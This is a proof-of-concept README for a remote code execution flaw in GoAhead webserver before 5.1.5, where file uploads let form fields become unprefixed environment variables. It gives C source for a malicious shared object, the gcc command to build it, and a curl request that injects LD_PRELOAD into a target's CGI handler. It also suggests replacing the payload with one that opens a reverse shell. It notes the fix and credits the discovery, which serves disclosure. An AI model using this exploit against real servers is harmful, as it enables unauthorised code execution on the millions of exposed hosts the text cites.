# Goahead webserver (pre v5.1.5) RCE PoC

A recent bug in Goahead Webserver was discovered by [William Bowling](https://twitter.com/wcbowling) which leads to RCE on the exploited server.

The issue exists prior to version 5.1.5 which, according to [Shodan covers around 2.8mio servers on the internet](https://www.shodan.io/search?query=goahead). 

The RCE is caused by the the fact that if the file upload filter is enabled, then the user can upload files and at the same time set user form variabled. 

These variabled ends up as being OS environment variables. This is normally not a problem, as in normal form upload cases, the env variables will get prefixed with CGI_ (default). If, however the file upload filter is enabled, then an error in the code causes this prefix to be left out = instant RCE via env variables + file. 


## Creating simple shared object 
The following will just invoke whoami command on the remote server but could be anything really:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    system("whoami");
}
```
Compile with:
```Bash
gcc -fPIC -shared -o poc.so poc.c -nostartfiles
```
## Exploiting the server
now we are ready to send our file to the server. This can be done using curl:
```bash
curl -X POST  http://[TARGET]/cgi-bin/ -F "LD_PRELOAD=/proc/self/fd/0" -F file='@poc.so;encoder=base64'
```
change `[TARGET]` to the domain/ip of the target server. 

You will probably see an error from the server, but try with another shared object that e.g. calls back to you with a nice shell 👍

## Fix
A fix is out with goahead 5.1.5 here: [https://github.com/embedthis/goahead/issues/305]

## Credits 
The issue was initially found by Willian Bowling from Perfect Blue CTF team. 
During [pbCTF 2021](https://ctf.perfect.blue/), a challange was the, at that time, existing version (5.1.4) of goahead server, and togetther with [Kalmarunionen CTF Team](https://kalmarunionen.dk) we came across the same 0day issue in the code (yet to be disclosed to the authors). 
